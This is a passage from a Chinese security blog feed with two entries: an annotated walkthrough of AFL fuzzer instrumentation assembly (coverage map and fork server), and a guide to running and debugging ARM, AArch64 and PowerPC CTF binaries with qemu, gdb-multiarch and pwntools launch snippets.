&quot;  .byte 0x9f &#x2F;* lahf *&#x2F;\n&quot;#else  &quot;  lahf\n&quot;#endif &#x2F;* ^__OpenBSD__, etc *&#x2F;  &quot;  seto  %al\n&quot;  &quot;\n&quot;  &quot;  &#x2F;* Check if SHM region is already mapped. *&#x2F;\n&quot;;检查共享内存区域是否已经映射  &quot;\n&quot;  &quot;  movq  __afl_area_ptr(%rip), %rdx\n&quot;;获取共享内存区域 __afl_area_ptr 地址  &quot;  testq %rdx, %rdx\n&quot;  &quot;  je    __afl_setup\n&quot;;如果__afl_area_ptr 为零即尚未映射，则调用 __afl_setup 函数进行初始化  &quot;\n&quot;  &quot;__afl_store:\n&quot;;路径记录逻辑  &quot;\n&quot;  &quot;  &#x2F;* Calculate and store hit for the code location specified in rcx. *&#x2F;\n&quot;;计算并存储 rcx 中指定的代码位置的命中率  &quot;\n&quot;#ifndef COVERAGE_ONLY  &quot;  xorq __afl_prev_loc(%rip), %rcx\n&quot;;rcx &#x3D; rcx ^ __afl_prev_loc  &quot;  xorq %rcx, __afl_prev_loc(%rip)\n&quot;;__afl_prev_loc &#x3D; 原 rcx 值  &quot;  shrq $1, __afl_prev_loc(%rip)\n&quot;;将上一个代码位置右移一位（优化存储）#endif &#x2F;* ^!COVERAGE_ONLY *&#x2F;  &quot;\n&quot;#ifdef SKIP_COUNTS;定义了是否仅记录命中次数（orb）还是累加命中次数（incb）  &quot;  orb  $1, (%rdx, %rcx, 1)\n&quot;;将计算结果存储到共享内存中，rdx &#x3D; __afl_area_ptr#else  &quot;  incb (%rdx, %rcx, 1)\n&quot;;将计算结果存储到共享内存中#endif &#x2F;* ^SKIP_COUNTS *&#x2F;  &quot;\n&quot;  &quot;__afl_return:\n&quot;;恢复标志寄存器的状态并返回  &quot;\n&quot;  &quot;  addb $127, %al\n&quot;;调整标志寄存器的状态#if defined(__OpenBSD__)  || (defined(__FreeBSD__) &amp;&amp; (__FreeBSD__ &lt; 9))  &quot;  .byte 0x9e &#x2F;* sahf *&#x2F;\n&quot;;将 ah 寄存器的内容加载到标志寄存器中（恢复标志寄存器的状态）#else  &quot;  sahf\n&quot;;将 ah 寄存器的内容加载到标志寄存器中（恢复标志寄存器的状态）#endif &#x2F;* ^__OpenBSD__, etc *&#x2F;  &quot;  ret\n&quot;;返回  &quot;\n&quot;  &quot;.align 8\n&quot;  &quot;\n&quot;  &quot;__afl_setup:\n&quot;;初始化共享内存  &quot;\n&quot;  &quot;  &#x2F;* Do not retry setup if we had previous failures. *&#x2F;\n&quot;  &quot;\n&quot;  &quot;  cmpb $0, __afl_setup_failure(%rip)\n&quot;  &quot;  jne __afl_return\n&quot;;获取 __afl_setup_failure，如果上次 setup 失败则不再进行 setup，直接跳转到 __afl_return 返回  &quot;\n&quot;  &quot;  &#x2F;* Check out if we have a global pointer on file. *&#x2F;\n&quot;  &quot;\n&quot;#ifndef __APPLE__  ...#else  &quot;  movq  __afl_global_area_ptr(%rip), %rdx\n&quot;;加载全局共享内存指针#endif &#x2F;* !^__APPLE__ *&#x2F;  &quot;  testq %rdx, %rdx\n&quot;  &quot;  je    __afl_setup_first\n&quot;·;没有映射过全局共享内存指针就调用 __afl_setup_first 初始化  &quot;\n&quot;  &quot;  movq %rdx, __afl_area_ptr(%rip)\n&quot;;将 __afl_setup_first 得到的共享内存区域传递给 __afl_area_ptr  &quot;  jmp  __afl_store\n&quot; ;跳转回 __afl_store  &quot;\n&quot;  &quot;__afl_setup_first:\n&quot;;第一次初始化共享内存  &quot;\n&quot;  &quot;  &#x2F;* Save everything that is not yet saved and that may be touched by getenv() and several other libcalls we&#39;ll be relying on. *&#x2F;\n&quot;  &quot;\n&quot;  &quot;  leaq -352(%rsp), %rsp\n&quot;  &quot;\n&quot;  &quot;  movq %rax,   0(%rsp)\n&quot;  &quot;  movq %rcx,   8(%rsp)\n&quot;  &quot;  movq %rdi,  16(%rsp)\n&quot;  &quot;  movq %rsi,  32(%rsp)\n&quot;  &quot;  movq %r8,   40(%rsp)\n&quot;  &quot;  movq %r9,   48(%rsp)\n&quot;  &quot;  movq %r10,  56(%rsp)\n&quot;  &quot;  movq %r11,  64(%rsp)\n&quot;  &quot;\n&quot;  &quot;  movq %xmm0,  96(%rsp)\n&quot;  &quot;  movq %xmm1,  112(%rsp)\n&quot;  &quot;  movq %xmm2,  128(%rsp)\n&quot;  &quot;  movq %xmm3,  144(%rsp)\n&quot;  &quot;  movq %xmm4,  160(%rsp)\n&quot;  &quot;  movq %xmm5,  176(%rsp)\n&quot;  &quot;  movq %xmm6,  192(%rsp)\n&quot;  &quot;  movq %xmm7,  208(%rsp)\n&quot;  &quot;  movq %xmm8,  224(%rsp)\n&quot;  &quot;  movq %xmm9,  240(%rsp)\n&quot;  &quot;  movq %xmm10, 256(%rsp)\n&quot;  &quot;  movq %xmm11, 272(%rsp)\n&quot;  &quot;  movq %xmm12, 288(%rsp)\n&quot;  &quot;  movq %xmm13, 304(%rsp)\n&quot;  &quot;  movq %xmm14, 320(%rsp)\n&quot;  &quot;  movq %xmm15, 336(%rsp)\n&quot;;保存寄存器到栈上  &quot;\n&quot;  &quot;  &#x2F;* Map SHM, jumping to __afl_setup_abort if something goes wrong. *&#x2F;\n&quot;  &quot;\n&quot;  &quot;  &#x2F;* The 64-bit ABI requires 16-byte stack alignment. We&#39;ll keep the\n&quot;  &quot;     original stack ptr in the callee-saved r12. *&#x2F;\n&quot;  &quot;\n&quot;  &quot;  pushq %r12\n&quot;  &quot;  movq  %rsp, %r12\n&quot;  &quot;  subq  $16, %rsp\n&quot;  &quot;  andq  $0xfffffffffffffff0, %rsp\n&quot;  &quot;\n&quot;  &quot;  leaq .AFL_SHM_ENV(%rip), %rdi\n&quot;  CALL_L64(&quot;getenv&quot;);获取共享内存的 ID  &quot;\n&quot;  &quot;  testq %rax, %rax\n&quot;  &quot;  je    __afl_setup_abort\n&quot;  &quot;\n&quot;  &quot;  movq  %rax, %rdi\n&quot;  CALL_L64(&quot;atoi&quot;);ID转换成整数  &quot;\n&quot;  &quot;  xorq %rdx, %rdx   &#x2F;* shmat flags    *&#x2F;\n&quot;  &quot;  xorq %rsi, %rsi   &#x2F;* requested addr *&#x2F;\n&quot;  &quot;  movq %rax, %rdi   &#x2F;* SHM ID         *&#x2F;\n&quot;  CALL_L64(&quot;shmat&quot;);将共享内存映射到当前进程的地址空间  &quot;\n&quot;  &quot;  cmpq $-1, %rax\n&quot;  &quot;  je   __afl_setup_abort\n&quot;;如果失败，跳转到 __afl_setup_abort  &quot;\n&quot;  &quot;  &#x2F;* Store the address of the SHM region. *&#x2F;\n&quot;  &quot;\n&quot;  &quot;  movq %rax, %rdx\n&quot;  &quot;  movq %rax, __afl_area_ptr(%rip)\n&quot;;将共享内存的地址存储到 __afl_area_ptr 中  &quot;\n&quot;#ifdef __APPLE__  ...#else  &quot;  movq __afl_global_area_ptr@GOTPCREL(%rip), %rdx\n&quot;;全局共享内存指针赋值给 rdx  &quot;  movq %rax, (%rdx)\n&quot;;共享内存的地址存放到全局共享内存指针中#endif &#x2F;* ^__APPLE__ *&#x2F;  &quot;  movq %rax, %rdx\n&quot;;共享内存的地址给 rdx  &quot;\n&quot;  &quot;__afl_forkserver:\n&quot;;Fork Server 模式，避免重复调用 execve  &quot;\n&quot;  &quot;  &#x2F;* Enter the fork server mode to avoid the overhead of execve() calls. We\n&quot;  &quot;     push rdx (area ptr) twice to keep stack alignment neat. *&#x2F;\n&quot;  &quot;\n&quot;  &quot;  pushq %rdx\n&quot;  &quot;  pushq %rdx\n&quot;;保持栈平衡  &quot;\n&quot;  &quot;  &#x2F;* Phone home and tell the parent that we&#39;re OK. (Note that signals with\n&quot;  &quot;     no SA_RESTART will mess it up). If this fails, assume that the fd is\n&quot;  &quot;     closed because we were execve()d from an instrumented binary, or because\n&quot;  &quot;     the parent doesn&#39;t want to use the fork server. *&#x2F;\n&quot;  &quot;\n&quot;  &quot;  movq $4, %rdx               &#x2F;* length    *&#x2F;\n&quot;  &quot;  leaq __afl_temp(%rip), %rsi &#x2F;* data      *&#x2F;\n&quot;  &quot;  movq $&quot; STRINGIFY((FORKSRV_FD + 1)) &quot;, %rdi       &#x2F;* file desc *&#x2F;\n&quot;  CALL_L64(&quot;write&quot;)  &quot;\n&quot;  &quot;  cmpq $4, %rax\n&quot;  &quot;  jne  __afl_fork_resume\n&quot;  &quot;\n&quot;  &quot;__afl_fork_wait_loop:\n&quot;  &quot;\n&quot;  &quot;  &#x2F;* Wait for parent by reading from the pipe. Abort if read fails. *&#x2F;\n&quot;  &quot;\n&quot;  &quot;  movq $4, %rdx               &#x2F;* length    *&#x2F;\n&quot;  &quot;  leaq __afl_temp(%rip), %rsi &#x2F;* data      *&#x2F;\n&quot;  &quot;  movq $&quot; STRINGIFY(FORKSRV_FD) &quot;, %rdi             &#x2F;* file desc *&#x2F;\n&quot;  CALL_L64(&quot;read&quot;)  &quot;  cmpq $4, %rax\n&quot;  &quot;  jne  __afl_die\n&quot;  &quot;\n&quot;  &quot;  &#x2F;* Once woken up, create a clone of our process. This is an excellent use\n&quot;  &quot;     case for syscall(__NR_clone, 0, CLONE_PARENT), but glibc boneheadedly\n&quot;  &quot;     caches getpid() results and offers no way to update the value, breaking\n&quot;  &quot;     abort(), raise(), and a bunch of other things :-( *&#x2F;\n&quot;  &quot;\n&quot;  CALL_L64(&quot;fork&quot;);父进程通过管道与子进程通信  &quot;  cmpq $0, %rax\n&quot;  &quot;  jl   __afl_die\n&quot;  &quot;  je   __afl_fork_resume\n&quot;  &quot;\n&quot;  &quot;  &#x2F;* In parent process: write PID to pipe, then wait for child. *&#x2F;\n&quot;  &quot;\n&quot;  &quot;  movl %eax, __afl_fork_pid(%rip)\n&quot;  &quot;\n&quot;  &quot;  movq $4, %rdx                   &#x2F;* length    *&#x2F;\n&quot;  &quot;  leaq __afl_fork_pid(%rip), %rsi &#x2F;* data      *&#x2F;\n&quot;  &quot;  movq $&quot; STRINGIFY((FORKSRV_FD + 1)) &quot;, %rdi             &#x2F;* file desc *&#x2F;\n&quot;  CALL_L64(&quot;write&quot;)  &quot;\n&quot;  &quot;  movq $0, %rdx                   &#x2F;* no flags  *&#x2F;\n&quot;  &quot;  leaq __afl_temp(%rip), %rsi     &#x2F;* status    *&#x2F;\n&quot;  &quot;  movq __afl_fork_pid(%rip), %rdi &#x2F;* PID       *&#x2F;\n&quot;  CALL_L64(&quot;waitpid&quot;)  &quot;  cmpq $0, %rax\n&quot;  &quot;  jle  __afl_die\n&quot;  &quot;\n&quot;  &quot;  &#x2F;* Relay wait status to pipe, then loop back. *&#x2F;\n&quot;  &quot;\n&quot;  &quot;  movq $4, %rdx               &#x2F;* length    *&#x2F;\n&quot;  &quot;  leaq __afl_temp(%rip), %rsi &#x2F;* data      *&#x2F;\n&quot;  &quot;  movq $&quot; STRINGIFY((FORKSRV_FD + 1)) &quot;, %rdi         &#x2F;* file desc *&#x2F;\n&quot;  CALL_L64(&quot;write&quot;);父进程等待子进程执行完毕后，将状态信息传递回子进程  &quot;\n&quot;  &quot;  jmp  __afl_fork_wait_loop\n&quot;;子进程关闭管道文件描述符后继续执行  &quot;\n&quot;  &quot;__afl_fork_resume:\n&quot;;子进程恢复执行  &quot;\n&quot;  &quot;  &#x2F;* In child process: close fds, resume execution. *&#x2F;\n&quot;  &quot;\n&quot;  &quot;  movq $&quot; STRINGIFY(FORKSRV_FD) &quot;, %rdi\n&quot;  CALL_L64(&quot;close&quot;)  &quot;\n&quot;  &quot;  movq $&quot; STRINGIFY((FORKSRV_FD + 1)) &quot;, %rdi\n&quot;  CALL_L64(&quot;close&quot;);关闭管道文件描述符  &quot;\n&quot;  &quot;  popq %rdx\n&quot;  &quot;  popq %rdx\n&quot;  &quot;\n&quot;  &quot;  movq %r12, %rsp\n&quot;  &quot;  popq %r12\n&quot;  &quot;\n&quot;  &quot;  movq  0(%rsp), %rax\n&quot;  &quot;  movq  8(%rsp), %rcx\n&quot;  &quot;  movq 16(%rsp), %rdi\n&quot;  &quot;  movq 32(%rsp), %rsi\n&quot;  &quot;  movq 40(%rsp), %r8\n&quot;  &quot;  movq 48(%rsp), %r9\n&quot;  &quot;  movq 56(%rsp), %r10\n&quot;  &quot;  movq 64(%rsp), %r11\n&quot;  &quot;\n&quot;  &quot;  movq  96(%rsp), %xmm0\n&quot;  &quot;  movq 112(%rsp), %xmm1\n&quot;  &quot;  movq 128(%rsp), %xmm2\n&quot;  &quot;  movq 144(%rsp), %xmm3\n&quot;  &quot;  movq 160(%rsp), %xmm4\n&quot;  &quot;  movq 176(%rsp), %xmm5\n&quot;  &quot;  movq 192(%rsp), %xmm6\n&quot;  &quot;  movq 208(%rsp), %xmm7\n&quot;  &quot;  movq 224(%rsp), %xmm8\n&quot;  &quot;  movq 240(%rsp), %xmm9\n&quot;  &quot;  movq 256(%rsp), %xmm10\n&quot;  &quot;  movq 272(%rsp), %xmm11\n&quot;  &quot;  movq 288(%rsp), %xmm12\n&quot;  &quot;  movq 304(%rsp), %xmm13\n&quot;  &quot;  movq 320(%rsp), %xmm14\n&quot;  &quot;  movq 336(%rsp), %xmm15\n&quot;  &quot;\n&quot;  &quot;  leaq 352(%rsp), %rsp\n&quot;;恢复寄存器的值  &quot;\n&quot;  &quot;  jmp  __afl_store\n&quot;;跳转回路径记录逻辑  &quot;\n&quot;  &quot;__afl_die:\n&quot;  &quot;\n&quot;  &quot;  xorq %rax, %rax\n&quot;  CALL_L64(&quot;_exit&quot;);退出程序  &quot;\n&quot;  &quot;__afl_setup_abort:\n&quot;;初始化失败处理  &quot;\n&quot;  &quot;  &#x2F;* Record setup failure so that we don&#39;t keep calling\n&quot;  &quot;     shmget() &#x2F; shmat() over and over again. *&#x2F;\n&quot;  &quot;\n&quot;  &quot;  incb __afl_setup_failure(%rip)\n&quot;;增加 __afl_setup_failure 的值，避免重复初始化  &quot;\n&quot;  &quot;  movq %r12, %rsp\n&quot;  &quot;  popq %r12\n&quot;  &quot;\n&quot;  &quot;  movq  0(%rsp), %rax\n&quot;  &quot;  movq  8(%rsp), %rcx\n&quot;  &quot;  movq 16(%rsp), %rdi\n&quot;  &quot;  movq 32(%rsp), %rsi\n&quot;  &quot;  movq 40(%rsp), %r8\n&quot;  &quot;  movq 48(%rsp), %r9\n&quot;  &quot;  movq 56(%rsp), %r10\n&quot;  &quot;  movq 64(%rsp), %r11\n&quot;  &quot;\n&quot;  &quot;  movq  96(%rsp), %xmm0\n&quot;  &quot;  movq 112(%rsp), %xmm1\n&quot;  &quot;  movq 128(%rsp), %xmm2\n&quot;  &quot;  movq 144(%rsp), %xmm3\n&quot;  &quot;  movq 160(%rsp), %xmm4\n&quot;  &quot;  movq 176(%rsp), %xmm5\n&quot;  &quot;  movq 192(%rsp), %xmm6\n&quot;  &quot;  movq 208(%rsp), %xmm7\n&quot;  &quot;  movq 224(%rsp), %xmm8\n&quot;  &quot;  movq 240(%rsp), %xmm9\n&quot;  &quot;  movq 256(%rsp), %xmm10\n&quot;  &quot;  movq 272(%rsp), %xmm11\n&quot;  &quot;  movq 288(%rsp), %xmm12\n&quot;  &quot;  movq 304(%rsp), %xmm13\n&quot;  &quot;  movq 320(%rsp), %xmm14\n&quot;  &quot;  movq 336(%rsp), %xmm15\n&quot;  &quot;\n&quot;  &quot;  leaq 352(%rsp), %rsp\n&quot;;恢复寄存器  &quot;\n&quot;  &quot;  jmp __afl_return\n&quot;;跳转回返回逻辑  &quot;\n&quot;  &quot;.AFL_VARS:\n&quot;  &quot;\n&quot;;以下为其他变量定义，定义共享内存指针、Fork Server PID、临时变量和全局共享内存指针#ifdef __APPLE__...#ifndef COVERAGE_ONLY  &quot;  .comm   __afl_prev_loc, 8\n&quot;#endif &#x2F;* !COVERAGE_ONLY *&#x2F;  &quot;  .comm   __afl_fork_pid, 4\n&quot;  &quot;  .comm   __afl_temp, 4\n&quot;  &quot;  .comm   __afl_setup_failure, 1\n&quot;#else  &quot;  .lcomm   __afl_area_ptr, 8\n&quot;#ifndef COVERAGE_ONLY  &quot;  .lcomm   __afl_prev_loc, 8\n&quot;#endif &#x2F;* !COVERAGE_ONLY *&#x2F;  &quot;  .lcomm   __afl_fork_pid, 4\n&quot;  &quot;  .lcomm   __afl_temp, 4\n&quot;  &quot;  .lcomm   __afl_setup_failure, 1\n&quot;#endif &#x2F;* ^__APPLE__ *&#x2F;  &quot;  .comm    __afl_global_area_ptr, 8, 8\n&quot;  &quot;\n&quot;  &quot;.AFL_SHM_ENV:\n&quot;  &quot;  .asciz \&quot;&quot; SHM_ENV_VAR &quot;\&quot;\n&quot;;环境变量定义  &quot;\n&quot;  &quot;&#x2F;* --- END --- *&#x2F;\n&quot;  &quot;\n&quot;;#endif &#x2F;* !_HAVE_AFL_AS_H *&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.z1r0.top/2023/03/23/AFL-fuzz%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/">https://www.z1r0.top/2023/03/23/AFL-fuzz%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;afl-gcc&quot;&gt;&lt;a href=&quot;#afl-gcc&quot; class=&quot;headerlink&quot; title=&quot;afl-gcc&quot;&gt;&lt;/a&gt;afl-gcc&lt;/h2&gt;&lt;h3 id=&quot;gdb调试&quot;&gt;&lt;a href=&quot;#gdb调试&quot; class=&quot;headerlink&quot; ti</summary>
      
    
    
    
    <category term="fuzz" scheme="https://starrysky1004.github.io/categories/fuzz/"/>
    
    
    <category term="fuzz" scheme="https://starrysky1004.github.io/tags/fuzz/"/>
    
    <category term="AFL" scheme="https://starrysky1004.github.io/tags/AFL/"/>
    
  </entry>
  
  <entry>
    <title>异构pwn运行与调试</title>
    <link href="https://starrysky1004.github.io/2025/02/10/yi-gou-pwn-yun-xing-yu-diao-shi/yi-gou-pwn-yun-xing-yu-diao-shi/"/>
    <id>https://starrysky1004.github.io/2025/02/10/yi-gou-pwn-yun-xing-yu-diao-shi/yi-gou-pwn-yun-xing-yu-diao-shi/</id>
    <published>2025-02-10T15:11:50.000Z</published>
    <updated>2025-02-12T12:55:01.046Z</updated>
    
    <content type="html"><![CDATA[<h2 id="qemu安装"><a href="#qemu安装" class="headerlink" title="qemu安装"></a>qemu安装</h2><p>安装<code>qemu qemu-user qemu-user-static</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> qemu qemu-user qemu-user-static<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装<code>qemu-system</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> qemu-system uml-utilities bridge-utils<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>运行的时候不一定要 -L 指定动态链接库</p><ul><li><p>qemu-usr ：指定动态链接库运行</p><ul><li><p>安装动态链接库</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">$ apt search <span class="token string">"libc6-"</span> <span class="token operator">|</span> grep <span class="token string">"powerpc"</span>$ sudo apt<span class="token operator">-</span>get install libc6<span class="token operator">-</span>powerpc<span class="token operator">-</span>cross<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul></li><li><p>qemu-user-static ：包含了所有必需的库和二进制文件，运行静态链接的程序</p></li><li><p>qemu-system ： 模拟整个计算机系统的跨平台运行</p></li></ul><h2 id="调试工具安装"><a href="#调试工具安装" class="headerlink" title="调试工具安装"></a>调试工具安装</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> gdb-multiarch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>动态链接库冲突：<code>set sysroot lib路径</code></p><h2 id="arm"><a href="#arm" class="headerlink" title="arm"></a>arm</h2><h3 id="arm32"><a href="#arm32" class="headerlink" title="arm32"></a>arm32</h3><h4 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">qemu-arm <span class="token parameter variable">-L</span> /usr/arm-linux-gnueabi ./pwn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'arm'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"qemu-arm"</span><span class="token punctuation">,</span><span class="token string">"-g"</span><span class="token punctuation">,</span><span class="token string">"1234"</span><span class="token punctuation">,</span><span class="token string">"-L"</span><span class="token punctuation">,</span> <span class="token string">"/usr/arm-linux-gnueabi"</span><span class="token punctuation">,</span> fileName<span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gdb filename<span class="token builtin class-name">set</span> architecture armadd-symbol-file/set solib-search-path ./libc.so.6attach pid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="aarch64"><a href="#aarch64" class="headerlink" title="aarch64"></a>aarch64</h3><h4 id="环境构建"><a href="#环境构建" class="headerlink" title="环境构建"></a>环境构建</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> gcc-aarch64-linux-gnu g++-aarch64-linux-gnu<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="运行-1"><a href="#运行-1" class="headerlink" title="运行"></a>运行</h4><p><code>-g</code>指定端口，<code>-L</code>指定动态链接库，静态链接的程序无需该参数</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">qemu-aarch64 <span class="token parameter variable">-L</span> /usr/aarch64-linux-gnu/ ./pwn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>指定 libc 文件运行：文件结构 .&#x2F;libc&#x2F;lib&#x2F; 下存放 ld 和 libc，-L 指定 .&#x2F;libc</p><h4 id="调试-1"><a href="#调试-1" class="headerlink" title="调试"></a>调试</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gdb-multiarch <span class="token parameter variable">-q</span> ./pwn<span class="token builtin class-name">set</span> architecture aarch64<span class="token builtin class-name">set</span> endian littleadd-symbol-file ./libc-2.21.sotarget remote localhost:1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'aarch64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"qemu-aarch64"</span><span class="token punctuation">,</span> <span class="token string">"-g"</span><span class="token punctuation">,</span> <span class="token string">"1234"</span><span class="token punctuation">,</span> <span class="token string">"-L"</span><span class="token punctuation">,</span> <span class="token string">"/usr/aarch64-linux-gnu/"</span><span class="token punctuation">,</span> file_name<span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="powerpc"><a href="#powerpc" class="headerlink" title="powerpc"></a>powerpc</h2><h3 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h3><p>安装<code>powerpc</code>交叉编译工具</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sudo</span> <span class="token function">apt</span> <span class="token function">install</span> gcc-powerpc-linux-gnu binutils-powerpc-linux-gnu<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装动态链接库</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">apt</span> search <span class="token string">"libc6-"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"powerpc"</span>$ <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> libc6-powerpc-cross<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="运行-2"><a href="#运行-2" class="headerlink" title="运行"></a>运行</h3><p>运行<code>powerpc</code> <strong>64 位是 ppc64，64位小端序是 qemu-ppc64le</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$qemu</span>-ppc <span class="token parameter variable">-L</span> /usr/powerpc-linux-gnu ./hello<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$qemu</span>-ppc-static ./pwn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'powerpc'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">,</span> endian <span class="token operator">=</span> <span class="token string">'big'</span><span class="token punctuation">)</span>process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"qemu-ppc"</span><span class="token punctuation">,</span><span class="token string">"-g"</span><span class="token punctuation">,</span><span class="token string">"1234"</span><span class="token punctuation">,</span><span class="token string">"-L"</span><span class="token punctuation">,</span> <span class="token string">"/usr/powerpc-linux-gnu"</span><span class="token punctuation">,</span> file_name<span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="调试-2"><a href="#调试-2" class="headerlink" title="调试"></a>调试</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ gdb-multiarch <span class="token parameter variable">-q</span> <span class="token parameter variable">-ex</span> <span class="token string">"set architecture powerpc:common"</span> ./filename<span class="token builtin class-name">set</span> endian big / littletarget remote :1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="编译"><a href="#编译" class="headerlink" 